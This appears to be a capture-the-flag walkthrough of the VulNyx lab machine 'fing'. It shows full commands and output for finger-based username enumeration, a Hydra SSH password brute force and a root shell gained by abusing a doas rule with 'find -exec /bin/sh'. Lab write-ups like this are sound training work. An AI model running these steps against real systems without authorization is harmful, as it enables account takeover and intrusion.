# fing

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| fing | d4t4s3c | Low | VulNyx |

**Summary:** The fing machine exposed three services on the network: SSH on port 22, an Apache default page on port 80, and a legacy `finger` daemon on port 79. The finger service, an ancient remote user information protocol, answered queries with the full account record of any existing user, making it a perfect oracle for username enumeration. `finger-user-enum` was pointed at the service with a generic names wordlist and, after wading through thousands of negative responses, it positively identified the account `adam`, disclosing his home directory, login shell, and last login details. Hydra then brute forced SSH against `adam` and recovered the password `passion`, granting entry to the box as a normal user. Inside, a search for setuid binaries surfaced an unusual SUID utility, `/usr/bin/doas`, the OpenBSD-style alternative to `sudo`. Reading the configuration at `/etc/doas.conf` exposed a dangerous permission rule: `adam` was allowed to execute `/usr/bin/find` as root without any password. Since `find` supports the `-exec` option, which runs an arbitrary command against each matched file, the privilege was trivially weaponized. Running `doas -u root /usr/bin/find /etc/doas.conf -exec /bin/sh \; -quit` produced an immediate root shell, and both the user and root flags were captured in one command.

---

## Reconnaissance

The assessment began with host discovery and a connectivity check against the fresh target on the lab network.

1. The victim machine was located at `192.168.56.107` and confirmed reachable with ping:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.56.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 05:33 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00073s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0013s latency).
MAC Address: 08:00:27:C7:A7:73 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.107 (192.168.56.107)
Host is up (0.0013s latency).
MAC Address: 08:00:27:FE:16:4F (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.96 seconds

┌──(kali㉿kali)-[~]
└─$ ping -c 2 192.168.56.107
PING 192.168.56.107 (192.168.56.107) 56(84) bytes of data.
64 bytes from 192.168.56.107: icmp_seq=1 ttl=64 time=0.750 ms
64 bytes from 192.168.56.107: icmp_seq=2 ttl=64 time=0.246 ms

--- 192.168.56.107 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1005ms
rtt min/avg/max/mdev = 0.246/0.498/0.750/0.252 ms

┌──(kali㉿kali)-[~]
└─$ ip=192.168.56.107
```

2. A full port scan with service and script detection was launched:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 05:34 -0400
Nmap scan report for 192.168.56.107 (192.168.56.107)
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
79/tcp open  finger  Linux fingerd
|_finger: No one logged on.\x0D
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:FE:16:4F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
```

Three ports were open. SSH and Apache were expected, but the finger service on port 79 was the standout. The finger protocol is designed to answer queries about users on a remote machine, and the banner that it was `No one logged on` confirmed the daemon was alive and ready to answer.

### Username Enumeration over finger

3. Since the finger daemon discloses the account record of any user it is asked about, `finger-user-enum` was used to test the entire seclists `names.txt` corpus against port 79:

```bash
──(kali㉿kali)-[~/nyx]
└─$ finger-user-enum -U /usr/share/seclists/Usernames/Names/names.txt -t 192.168.56.107
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10713
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Wed Aug 12 05:38:56 2026 #########
aarón@192.168.56.107: finger: aarón: no such user...
abagail@192.168.56.107: finger: abagail: no such user...
abbi@192.168.56.107: finger: abbi: no such user...
abrahán@192.168.56.107: finger: abrahán: no such user...
abu@192.168.56.107: finger: abu: no such user...
accounting@192.168.56.107: finger: accounting: no such user...
adair@192.168.56.107: finger: adair: no such user...
adam@192.168.56.107: Login: adam                                Name: adam..Directory: /home/adam                 Shell: /bin/bash..Last login Sun Apr 23 13:21 2023 (CEST) on pts/0 from 192.168.1.10..No mail...No Plan...
addy@192.168.56.107: finger: addy: no such user...
adi@192.168.56.107: finger: adi: no such user...
...
```

After thousands of negative responses, the query for `adam` returned a full user record: a login shell of `/bin/bash`, a home directory at `/home/adam`, and even the account's last login timestamp. This was a conclusive username enumeration victory, and `adam` became the target for credential attacks.

---

## Initial Access

### SSH Password Brute Force

4. With a confirmed username, Hydra was pointed at the SSH service using the rockyou wordlist:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ hydra -l adam -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 64 -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-12 05:43:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.56.107:22/
[STATUS] 579.00 tries/min, 579 tries in 00:01h, 14343859 to do in 412:54h, 25 active
[22][ssh] host: 192.168.56.107   login: adam   password: passion
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-12 05:45:22
```

The credentials `adam:passion` were recovered from rockyou, providing a valid login pair for the SSH service.

5. A session was then logged into the system as `adam`, and privilege escalation work began immediately with a scan for setuid binaries:

```bash
adam@fing:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 55528 ene 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 ene 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 58416 feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 39008 feb  5  2021 /usr/bin/doas
-rwsr-xr-x 1 root root 88304 feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52880 feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 35040 ene 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 63960 feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 44632 feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 481608 jul  2  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Most of the SUID list was standard Debian noise, but `/usr/bin/doas` stood out as unusual. `doas` is the OpenBSD privilege escalation tool, a modern replacement for `sudo`, and it is rarely shipped on default Debian systems. Its configuration file governs exactly who may run what, so it deserved immediate inspection.

---

## Privilege Escalation

### Abusing a Permissive doas Rule

6. The `doas` configuration was read to determine what `adam` was allowed to run:

```bash
adam@fing:~$ cat /etc/doas.conf 2>/dev/null
permit nopass keepenv adam as root cmd /usr/bin/find
```

The rule was explicit and dangerous: `adam` could execute `/usr/bin/find` as root without any password, preserving his environment. While restricting the command to `find` sounds safe in isolation, GNU `find` ships with the `-exec` option, which executes an arbitrary command for every matched file. That option turns the tool into a generic code execution primitive.

7. The `find` command was wrapped through `doas` and used to spawn a shell, with `-quit` ensuring the shell launched after the first match:

```bash
adam@fing:~$ doas -u root /usr/bin/find /etc/doas.conf -exec /bin/sh \; -quit
# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
fing
# cat /home/adam/user.txt /root/root.txt
```

The `-exec /bin/sh` clause executed a root shell against the matched file, instantly elevating the session to `uid=0`. The misconfigured `doas` rule, combined with the abusable `-exec` behavior of `find`, delivered full root access, and both the user and root flags were read from the root shell.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.107`, and a full Nmap scan exposed SSH on port 22, Apache on port 80, and a legacy finger daemon on port 79.

2. **Vulnerability Discovery**: The finger service behaved as an open user enumeration oracle. `finger-user-enum` queried over ten thousand names and positively disclosed the account `adam` with its home directory, shell, and last login record.

3. **Exploitation**: Hydra brute forced the SSH service with the rockyou wordlist and recovered the valid credentials `adam:passion`, granting a shell on the target as a low privilege user.

4. **Internal Enumeration**: A setuid scan surfaced `/usr/bin/doas`, an unusual privilege escalation utility. Reading `/etc/doas.conf` revealed a `nopass` rule permitting `adam` to run `/usr/bin/find` as root.

5. **Privilege Escalation**: The `-exec` option of GNU `find` was leveraged through the `doas` rule to spawn `/bin/sh` as root, producing an immediate root shell and complete compromise of the machine.